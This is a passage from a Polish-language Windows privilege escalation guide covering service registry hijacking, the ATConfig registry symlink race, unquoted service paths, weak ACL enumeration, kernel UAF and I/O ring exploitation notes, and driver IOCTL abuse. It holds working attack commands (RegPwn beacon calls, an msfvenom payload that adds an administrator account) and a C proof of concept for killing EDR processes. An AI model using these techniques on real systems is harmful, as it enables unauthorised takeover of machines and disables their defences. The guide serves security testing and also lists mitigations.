Aby zmienić ścieżkę pliku binarnego, który jest uruchamiany:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Wyścig symlinków rejestru umożliwiający zapis dowolnej wartości HKLM (ATConfig)

Niektóre funkcje ułatwień dostępu systemu Windows tworzą klucze **ATConfig** dla poszczególnych użytkowników, które są później kopiowane przez proces **SYSTEM** do klucza sesji HKLM. Wyścig **symbolicznego łącza** w rejestrze może przekierować ten uprzywilejowany zapis do **dowolnej ścieżki HKLM**, zapewniając możliwość **zapisu dowolnej wartości** HKLM.<sup>[[18]](#references)</sup>

Lokalizacje kluczy (przykład: Klawiatura ekranowa `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` zawiera listę zainstalowanych funkcji ułatwień dostępu.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` przechowuje konfigurację kontrolowaną przez użytkownika.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` jest tworzony podczas logowania/przejść do bezpiecznego pulpitu i może być zapisywany przez użytkownika.

Przebieg ataku (CVE-2026-24291 / ATConfig):

1. Ustaw wartość **HKCU ATConfig**, którą chcesz zapisać jako SYSTEM.
2. Wywołaj kopiowanie na bezpiecznym pulpicie (np. **LockWorkstation**), co uruchamia przepływ AT broker.
3. **Wygraj wyścig**, zakładając **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; gdy oplock zostanie wyzwolony, zastąp klucz **HKLM Session ATConfig** **łączem rejestru** prowadzącym do chronionego celu HKLM.
4. SYSTEM zapisuje wybraną przez atakującego wartość w przekierowanej ścieżce HKLM.

Po uzyskaniu możliwości zapisu dowolnej wartości HKLM można przejść do LPE, nadpisując wartości konfiguracji usługi:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/wiersz polecenia)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wybierz usługę, którą może uruchomić zwykły użytkownik (np. **`msiserver`**) i uruchom ją po zapisie. **Uwaga:** publiczna implementacja exploita **blokuje stację roboczą** w ramach wyścigu.

Przykładowe narzędzia (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Uprawnienia AppendData/AddSubdirectory do rejestru usług

Jeśli masz to uprawnienie do rejestru, oznacza to, że **możesz tworzyć podrejestry w jego obrębie**. W przypadku usług Windows to **wystarczy, aby wykonać dowolny kod:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Jeśli ścieżka do pliku wykonywalnego nie jest ujęta w cudzysłów, Windows spróbuje uruchomić każdy jej fragment kończący się przed spacją.

Na przykład dla ścieżki _C:\Program Files\Some Folder\Service.exe_ Windows spróbuje uruchomić:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Wyświetl wszystkie ścieżki usług nieujęte w cudzysłowy, z wyłączeniem ścieżek należących do wbudowanych usług systemu Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Możesz wykryć i wykorzystać** tę podatność za pomocą metasploit: `exploit/windows/local/trusted\_service\_path` Możesz ręcznie utworzyć plik binarny usługi za pomocą metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Działania naprawcze

Windows pozwala użytkownikom określić działania podejmowane w przypadku awarii usługi. Tę funkcję można skonfigurować tak, aby wskazywała plik binarny. Jeśli można go podmienić, eskalacja uprawnień może być możliwa. Więcej informacji można znaleźć w [oficjalnej dokumentacji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Skrypty uruchamiane przez zaplanowane zadania

W przypadku włączonego zadania, które uruchamia `cmd.exe /c` z plikiem `.bat` lub `.cmd`, sprawdź skrypt wskazany w **argumentach akcji**, a także `cmd.exe`. To samo dotyczy jawnego argumentu plikowego interpretera, takiego jak `-File` w PowerShellu. Jeśli zaplanowany plik wsadowy zawiera dosłowne wywołanie PowerShella z `-File`, sprawdź również ACL wskazanego skryptu; zmienne, instrukcje warunkowe i łączenie poleceń w powłoce wymagają ręcznego prześledzenia. Możliwość zapisu do skryptu lub jego katalogu nadrzędnego przez wywołującego może wskazywać na możliwość wykonania kodu w kontekście innego konta tylko wtedy, gdy skonfigurowany podmiot zabezpieczeń zadania różni się od wywołującego, a zadanie rzeczywiście dociera do tej akcji. ACL zezwalający wyłącznie na dopisywanie może mieć znaczenie w przypadku skryptów, ale wcześniejsze `exit` lub inny przebieg sterowania może sprawić, że dopisane wiersze nie zostaną wykonane. Przed stwierdzeniem możliwości eskalacji potwierdź efektywne ACL, [kontekst wykonywania zadania](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), katalog roboczy, wyzwalacz i zasady kontroli aplikacji. Inwentaryzacja nie powinna modyfikować skryptu ani uruchamiać zadania.

## Strumienie nazwane w dostępnych plikach

W NTFS plik, z którego można odczytywać dane, może zawierać nazwany strumień `:$DATA`, którego zawartość nie jest widoczna podczas zwykłego wyświetlania katalogu. W przypadku niewielkiego, istotnego zbioru dostępnych kopii zapasowych lub plików konfiguracyjnych przed otwarciem jakiejkolwiek zawartości sprawdź **nazwy i rozmiary** strumieni; Windows udostępnia je przez [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) oraz polecenie PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Nazwa strumienia sugerująca sekret jest jedynie wskazówką. Sprawdź efektywne uprawnienia do odczytu pliku, obsługę strumieni przez system plików, to, czy strumień zawiera użyteczne dane uwierzytelniające, oraz konto, na które faktycznie pozwalają się uwierzytelnić. Podczas rutynowej enumeracji unikaj rekurencyjnego skanowania strumieni i wyświetlania ich zawartości.

## Pliki wejściowe pomocnika z Windows Driver Kit uruchamianego przez zaplanowane zadanie

Opcjonalny Windows Driver Kit zawiera `StandaloneRunner.exe`, który może odczytywać pliki `command.txt`, `reboot.rsf` oraz plik projektu `working\rsf.rsf` z katalogu uruchomieniowego. Zaplanowane zadanie lub usługa uruchamiające tego pomocnika z uprzywilejowanym kontem mogą umożliwić wykonanie poleceń w kontekście tego konta dzięki uprawnieniom niskiego poziomu do zapisu w tych plikach wejściowych, nawet jeśli sam plik wykonywalny pomocnika jest chroniony. Potwierdź, że pliki są używane przez uprzywilejowany proces oraz że można utworzyć lub zmodyfikować **oba** pliki towarzyszące; samo znalezienie pomocnika nie wystarczy.

W przypadku zaplanowanego zadania sprawdź jego akcję [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) oraz ACL dwóch ścieżek do plików towarzyszących. Jeśli zadanie nie określa katalogu roboczego, katalog pliku wykonywalnego jest jedynie wskazówką do zweryfikowania, a nie dowodem na to, skąd zadanie odczytuje pliki wejściowe. Musi być również spełniony warunek dotyczący pliku roboczego projektu. Sprawdź rzeczywisty podmiot zabezpieczeń zadania, zamiast zakładać, że jest ono uruchamiane jako SYSTEM.

## Aplikacje

### Zainstalowane aplikacje

Sprawdź **uprawnienia do plików binarnych** (być może można nadpisać jeden z nich i eskalować uprawnienia) oraz **uprawnienia do folderów** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Ścieżka naprawy agenta Checkmk dla Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) dotyczy starszych agentów Checkmk dla Windows, które zapisywały pliki poleceń w `C:\Windows\Temp`, a następnie uruchamiały istniejący, chroniony przed zapisem plik, gdy jego zastąpienie się nie powiodło. Dostawca naprawił ten problem w wersjach 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Sprawdź pełny zainstalowany poziom poprawek oraz to, czy może zostać uruchomiona podatna operacja agenta; sama etykieta gałęzi, taka jak `2.1`, nie pozwala stwierdzić, czy system jest podatny. Podczas enumeracji można sprawdzić wersję, stan usługi i uprawnienia do katalogu Temp bez tworzenia plików ani uruchamiania poleceń agenta.

#### Przegląd usługi SAML ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) dotyczyło kompilacji ADSelfService Plus 6210 i wcześniejszych; dostawca naprawił ten problem w kompilacji 6211. Ma on znaczenie tylko wtedy, gdy SAML SSO **jest lub było** włączone. Wpis o zainstalowanym produkcie lub ścieżka usługi to zatem wskazówka, a nie potwierdzenie podatności: sprawdź dokładną kompilację, historię konfiguracji SAML, dostępność usługi z sieci oraz konto, na którym działa. Wykonanie kodu za pośrednictwem usługi odbywa się z uprawnieniami tego konta; uruchomienie jako SYSTEM wymaga, aby instancja działała jako SYSTEM. Możliwy do odczytu plik `OfflineBackup_*.ezip` w katalogu Backup produktu to osobna wskazówka dotycząca zaszyfrowanej kopii zapasowej, a nie dowód na dostępność użytecznych danych uwierzytelniających ani na tę lukę SAML. Podczas rutynowej enumeracji zanotuj jego ścieżkę i uprawnienia dostępu, nie rozpakowując go.

#### Granice uprawnień kontrolera Jenkins i kont domenowych

Na kontrolerze Jenkins działającym w systemie Windows odróżnij uprawnienie do utworzenia lub skonfigurowania zadania od uprawnienia do jego uruchomienia: [Jenkins opisuje je jako osobne uprawnienia `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Skonfigurowany harmonogram lub zdalny wyzwalacz może stanowić dodatkową drogę uruchomienia kompilacji, ale sprawdź, czy jest włączony i czy kompilacja faktycznie się uruchamia. Kod jest wykonywany z tożsamością kontrolera lub wybranego agenta, a zapisane dane uwierzytelniające są dostępne tylko wtedy, gdy zadanie może uzyskać dostęp do ich zakresu. Osobno sprawdź dostęp do metadanych `JENKINS_HOME`: Jenkins przechowuje dane uwierzytelniające i klucze szyfrujące w `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([przechowywanie sekretów w Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Sama ich obecność nie ujawnia hasła; zweryfikuj **uprawnienia do odczytu wymaganych plików** oraz odrębną ścieżkę ponownego użycia konta, nie wyświetlając sekretów we współdzielonych danych wyjściowych. Jeśli to konto ma uprawnienie zapisu do atrybutu `scriptPath` obiektu użytkownika AD, przed uznaniem tego za wykonanie kodu w kontekście innego użytkownika potwierdź, że ścieżka skryptu jest zapisywalna, a docelowy użytkownik rzeczywiście loguje się lub korzysta z zaplanowanego procesu, który ją uruchamia. Dalsza kontrola grup wymaga osobnej weryfikacji efektywnych uprawnień AD.

#### Tożsamość agenta Azure Pipelines self-hosted

W przypadku projektu Azure DevOps Server lub Azure Pipelines odróżnij uprawnienie do **utworzenia lub edycji** pipeline’u od uprawnienia do jego **umieszczenia w kolejce** i użycia wybranej puli agentów; [Microsoft osobno opisuje uprawnienia pipeline’ów](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) oraz [autoryzację puli](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Jeśli konto o niższych uprawnieniach może przesłać krok skryptu i uruchomić pipeline na własnym agencie Windows, krok jest wykonywany jako [skonfigurowane konto systemu operacyjnego agenta](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Zanim stwierdzisz, że dochodzi do przejścia między użytkownikami lub uzyskania uprawnień SYSTEM, zweryfikuj konkretny pipeline, ograniczenia dotyczące gałęzi i zasobów, autoryzowaną pulę, zadanie, które można uruchomić, oraz tożsamość usługi agenta. Zainstalowany agent, rola w projekcie lub uprawnienie do zapisu w repozytorium to tylko wskazówki; podczas pasywnej enumeracji sprawdź uprawnienia i lokalne metadane usługi, nie uruchamiając kompilacji.

#### Dane uwierzytelniające Microsoft Entra Connect Sync

[Microsoft rozróżnia](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **konto usługi ADSync**, które uruchamia usługę synchronizacji i uzyskuje dostęp do jej bazy SQL, od **konta łącznika AD DS**, którego uprawnienia katalogowe zależą od skonfigurowanych funkcji synchronizacji. Dane uwierzytelniające łącznika są przechowywane w tej bazie w postaci zaszyfrowanej, a materiał klucza jest [chroniony przez DPAPI w kontekście konta usługi ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sama zainstalowana usługa synchronizacji, grupa o nazwie sugerującej lokalne uprawnienia administratora lub dostęp do bazy danych nie potwierdzają, że da się odszyfrować dane uwierzytelniające ani uzyskać wyższe uprawnienia w domenie. Osobno sprawdź rzeczywiste uprawnienia do odczytu bazy, dostęp konta usługi i klucza, układ instalacji i SQL, skonfigurowaną tożsamość łącznika oraz efektywne uprawnienia AD tej tożsamości. Rutynowa enumeracja powinna ujawniać wyłącznie metadane usługi i dostępu, a nie odpytywać ani wyświetlać zapisanych sekretów.

#### Uprawnienia do bibliotek DLL obsługi sterowników drukarek

Zainstalowany sterownik drukarki może przechowywać pomocnicze biblioteki DLL w `C:\ProgramData` i ładować je w bardziej uprzywilejowanym procesie drukowania. Sprawdź listy ACL dokładnego katalogu sterownika i bibliotek DLL, w tym katalogów nadrzędnych oraz punktów ponownej analizy, nawet jeśli enumeracja WMI drukarek jest niedostępna. W przypadku [problemu ze sterownikiem drukarki Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) zgłoszona ścieżka to `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [oryginalny opis](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) opisuje ładowanie bibliotek DLL przez `PrintIsolationHost.exe`. Zapisowalna lista ACL to tylko wskazówka: zweryfikuj efektywny dostęp do zapisu po uwzględnieniu wpisów odmowy, to, czy odpowiedni sterownik jest zainstalowany i ładuje plik z uprzywilejowaną tożsamością, oraz czy zaktualizowany sterownik lub program zabezpieczający dostawcy naprawił tę instalację. Nie wnioskuj o podatności wyłącznie na podstawie nazwy katalogu ani wersji sterownika.

### Uprawnienia zapisu

Sprawdź, czy możesz zmodyfikować plik konfiguracyjny, aby odczytać jakiś specjalny plik, albo zmienić plik binarny uruchamiany przez konto Administratora (schedtasks).

Sposobem na znalezienie słabo zabezpieczonych uprawnień do folderów i plików w systemie jest wykonanie:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistence/execution przez autoload pluginów Notepad++

Notepad++ automatycznie ładuje każdą bibliotekę DLL pluginu znajdującą się w podfolderach `plugins`. Jeśli dostępna jest zapisywalna instalacja portable lub jej kopia, umieszczenie w niej złośliwego pluginu zapewnia automatyczne wykonanie kodu w procesie `notepad++.exe` przy każdym uruchomieniu (w tym z `DllMain` i callbacków pluginu).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Uruchamianie przy starcie

**Sprawdź, czy możesz nadpisać jakiś wpis rejestru lub plik binarny, który zostanie uruchomiony przez innego użytkownika.**\
**Przeczytaj** **poniższą stronę**, aby dowiedzieć się więcej o interesujących **lokalizacjach autoruns umożliwiających eskalację uprawnień**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sterowniki

Poszukaj potencjalnych **dziwnych/podatnych sterowników firm trzecich**.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Jeśli sterownik udostępnia prymitywne operacje dowolnego odczytu/zapisu w kernelu (częste w źle zaprojektowanych obsługach IOCTL), możesz eskalować uprawnienia, bezpośrednio kradnąc token SYSTEM z pamięci kernela.<sup>[[13]](#references)</sup> Zobacz technikę krok po kroku:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Powiązane materiały dotyczące exploitacji kernela Windows:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

W przypadku błędów race condition, w których podatne wywołanie otwiera ścieżkę Object Manager kontrolowaną przez atakującego, celowe spowolnienie wyszukiwania (za pomocą komponentów o maksymalnej długości lub głęboko zagnieżdżonych katalogów) może wydłużyć okno z mikrosekund do dziesiątek mikrosekund:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF-y w cancel-safe queue, ujawnienia z paged-pool i pivoty I/O ring

Niektóre łańcuchy LPE w kernelu Windows można zbudować z dwóch indywidualnie mało groźnych błędów: **race condition w cyklu życia cancel-safe queue**, która zwalnia żądanie/CBD, gdy blokada kolejki jest nadal utrzymywana, oraz ujawnienia typu **lock-release-before-copy**, które wycieka zwolnioną alokację paged-pool podczas `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Uwagi dotyczące audytu i exploitacji:

- **Zwolnienie pod blokadą + późniejsze anulowanie**: szukaj ścieżki sukcesu wykonującej **Acquire -> CompleteRequest/free -> Release**, podczas gdy ścieżka anulowania wykonuje **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Jeśli ścieżka sukcesu dochodzi do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` przed zwolnieniem blokady CBDQ/CSQ, wątek zablokowany w `NtCancelIoFileEx -> IopCsqCancelRoutine` może później wznowić działanie i przekazać zwolniony `PFLT_CALLBACK_DATA` do funkcji usuwającej sterownika.
- **Odzyskaj zwolniony obiekt kolejki** za pomocą kontrolowanej przez atakującego alokacji paged-pool o tym samym rozmiarze. Wpisy kolejki danych `NPFS` są przydatne, ponieważ ich zawartość i rozmiar można kontrolować, a później sondować je operacjami odczytu/podglądu potoku. Jeśli zwolniony obiekt zawiera wskaźniki listy, nadpisz je **cykliczną listą fałszywych węzłów żądań w pamięci użytkownika**, aby sterownik wielokrotnie przetwarzał zdefiniowane przez atakującego struktury żądań zamiast zakończyć działanie na oryginalnym początku listy.
- **Rozszerz przewidywalny zapis**: jeśli fałszywe żądanie przekieruje zagnieżdżony wskaźnik kontekstu używany przez zapisy księgowe (znaczniki czasu / QPC / pola sąsiadujące z licznikiem referencji), możesz uzyskać zapis kernela, w którym kontrolujesz **adres, ale nie wartość**. W takim przypadku zaatakuj pole **length/size** obiektu ze spryskanej puli zamiast końcowego wskaźnika kodu/danych, a następnie przeszukuj spryskane obiekty, aż uszkodzony obiekt umożliwi odczyt poza zakresem z paged-pool.
- **Wzorzec podatnego na race condition ujawnienia**: każde wywołanie systemowe wykonujące `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` jest dobrym kandydatem. Niezawodność zwiększa możliwość powiększenia kopiowanego bufora przez atakującego (na przykład przez dodanie wielu wpisów listy/zasobów, które zwiększają końcowy rozmiar alokacji serializatora), ponieważ dłuższe kopiowanie poszerza okno na podmianę bez konieczności powodowania awarii systemu.
- **Cele uzupełniania zawierające wiele wskaźników**: zarejestrowane tablice buforów Windows **I/O ring** są świetnymi celami ujawnienia, ponieważ ich rozmiar w paged-pool jest kontrolowany przez atakującego (`8 * regBufferCnt`), a każdy element jest wskaźnikiem kernela do `_IOP_MC_BUFFER_ENTRY`. Ujawnij jedną z tych tablic, odzyskaj otaczający ją `IORING_OBJECT`, a następnie uszkodź **`RegBuffers`** i **`RegBuffersCount`**, aby kolejne operacje I/O ring korzystały z fałszywych wpisów przygotowanych przez atakującego i umożliwiały dowolny odczyt/zapis w kernelu. Jeśli jedyny dostępny zapis daje stabilny bajt (na przykład z `KUSER_SHARED_DATA+0x14`), użyj **nakładających się, nie wyrównanych zapisów**, aby utworzyć wskaźnik użytkownika z powtarzającym się bajtem, na przykład `0x0101010101010101`, zmapuj go za pomocą `VirtualAlloc` i umieść tam fałszywą tablicę zarejestrowanych buforów.<sup>[[30]](#references)</sup>

Przydatne wskaźniki diagnostyczne:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Gdy uzyskasz dowolny odczyt/zapis w kernelu za pomocą uszkodzonego I/O ring, przejmij token SYSTEM, korzystając ze standardowego workflow po uzyskaniu primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives korupcji pamięci hive rejestru

Współczesne podatności w hive pozwalają przygotowywać deterministyczne układy pamięci, wykorzystywać zapisywalne obiekty potomne HKLM/HKU i przekształcać korupcję metadanych w przepełnienia paged pool kernela bez niestandardowego drivera. Pełny łańcuch opisano tutaj:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Pomylenie typów w trybie direct `RtlQueryRegistryValues` z użyciem ścieżek kontrolowanych przez atakującego

Niektóre drivere akceptują ścieżkę rejestru z userlandu, sprawdzają jedynie, czy jest poprawnym ciągiem UTF-16, a następnie wywołują `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` z flagą `RTL_QUERY_REGISTRY_DIRECT`, przekazując jako cel skalarną zmienną na stosie, taką jak `int readValue`. Jeśli brakuje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` jest interpretowany zgodnie z **rzeczywistym** typem rejestru, a nie typem oczekiwanym przez programistę.

Tworzy to dwa przydatne primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: kontrolowana przez użytkownika ścieżka bezwzględna `\Registry\...` pozwala driverowi odpytywać klucze wybrane przez atakującego, ujawniać ich istnienie za pomocą kodów zwrotnych/logów, a czasem odczytywać wartości, do których wywołujący nie miałby bezpośredniego dostępu.
- **Korupcja pamięci kernela**: miejsce docelowe w postaci zmiennej skalarnej, takiej jak `&readValue`, może zostać zinterpretowane jako `REG_QWORD`, `UNICODE_STRING` lub bufor binarny o określonym rozmiarze, zależnie od typu wartości rejestru.

Praktyczne uwagi dotyczące exploita:

- **Zabezpieczenie w Windows 8 i nowszych**: jeśli zapytanie trafia do **niezaufanego hive** z flagą `RTL_QUERY_REGISTRY_DIRECT`, ale bez `RTL_QUERY_REGISTRY_TYPECHECK`, wywołania z kernela powodują awarię `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Aby zachować możliwość exploita, szukaj **kluczy zapisywalnych przez atakującego w zaufanych hive systemu** zamiast przygotowywać wartości w `HKCU`.
- **Przygotowanie w zaufanym hive**: użyj NtObjectManager, aby wyliczyć zapisywalne obiekty potomne `\Registry\Machine`, a następnie ponownie uruchom skanowanie z duplikatem tokena **o niskim poziomie integralności**, aby znaleźć klucze dostępne z kontekstów sandboxa:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: bezpośredni zapis 8 bajtów do 4-bajtowego `int` uszkadza sąsiednie dane na stosie i może częściowo nadpisać pobliski wskaźnik callbacka/funkcji.
- **`REG_SZ` / `REG_EXPAND_SZ`**: tryb direct wymaga, aby `EntryContext` wskazywał na `UNICODE_STRING`. Jeśli kod najpierw wczyta kontrolowaną przez atakującego wartość `REG_DWORD` do skalaru na stosie, a następnie ponownie użyje tego samego bufora do odczytu ciągu znaków, atakujący kontroluje `Length`/`MaximumLength` i częściowo wpływa na wskaźnik `Buffer`, co umożliwia częściowo kontrolowany zapis w kernelu.
- **`REG_BINARY`**: w przypadku dużych danych binarnych tryb direct traktuje pierwszy `LONG` pod adresem `EntryContext` jako rozmiar bufora ze znakiem. Jeśli wcześniejszy odczyt `REG_DWORD` pozostawi w ponownie użytym skalarze kontrolowaną przez atakującego **ujemną** wartość, kolejne zapytanie `REG_BINARY` kopiuje bajty atakującego bezpośrednio do sąsiednich slotów stosu. Jest to często najprostsza droga do pełnego nadpisania wskaźnika callbacka.

Silny wzorzec do wyszukiwania: **niejednorodne odczyty z rejestru do tej samej zmiennej na stosie bez jej ponownej inicjalizacji**. Wyszukaj `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponownie używane wskaźniki `EntryContext` oraz ścieżki kodu, w których pierwszy odczyt z rejestru decyduje o wykonaniu drugiego.

#### Nadużycie braku FILE_DEVICE_SECURE_OPEN w obiektach urządzeń (LPE + EDR kill)

Niektórzy podpisani sterownicy innych firm tworzą obiekt urządzenia z silnym SDDL za pomocą IoCreateDeviceSecure, ale zapominają ustawić FILE_DEVICE_SECURE_OPEN w DeviceCharacteristics. Bez tej flagi bezpieczna lista DACL nie jest egzekwowana przy otwieraniu urządzenia przez ścieżkę zawierającą dodatkowy komponent. Dzięki temu każdy nieuprzywilejowany użytkownik może uzyskać uchwyt, używając ścieżki przestrzeni nazw, takiej jak:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (z rzeczywistego przypadku)

Gdy użytkownik może otworzyć urządzenie, może nadużyć udostępnionych przez sterownik uprzywilejowanych IOCTL-i do LPE i manipulacji. Przykładowe możliwości zaobserwowane w praktyce:
- Zwracanie uchwytów z pełnym dostępem do dowolnych procesów (kradzież tokena / powłoka SYSTEM przez DuplicateTokenEx/CreateProcessAsUser).
- Nieograniczony odczyt/zapis surowego dysku (manipulacja offline, sztuczki z utrwalaniem przy rozruchu).
- Kończenie dowolnych procesów, w tym Protected Process/Light (PP/PPL), co umożliwia zabicie AV/EDR z poziomu przestrzeni użytkownika przez kernel.

Minimalny wzorzec PoC (tryb użytkownika):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Środki zaradcze dla deweloperów
- Zawsze ustawiaj FILE_DEVICE_SECURE_OPEN podczas tworzenia obiektów urządzeń, które mają być ograniczone przez DACL.
- Weryfikuj kontekst wywołującego w przypadku uprzywilejowanych operacji. Dodaj kontrole PP/PPL, zanim zezwolisz na zakończenie procesu lub zwrócenie uchwytów.
- Ograniczaj IOCTLs (maski dostępu, METHOD_*, walidacja danych wejściowych) i rozważ modele brokered zamiast bezpośrednich uprawnień jądra.

Pomysły na wykrywanie dla obrońców
- Monitoruj otwieranie podejrzanych nazw urządzeń w user mode (np. \\ .\\amsdk*) oraz określone sekwencje IOCTL wskazujące na nadużycie.
- Wymuszaj stosowanie listy zablokowanych podatnych sterowników Microsoftu (HVCI/WDAC/Smart App Control) i utrzymuj własne listy dozwolonych/zablokowanych.


## PATH DLL Hijacking

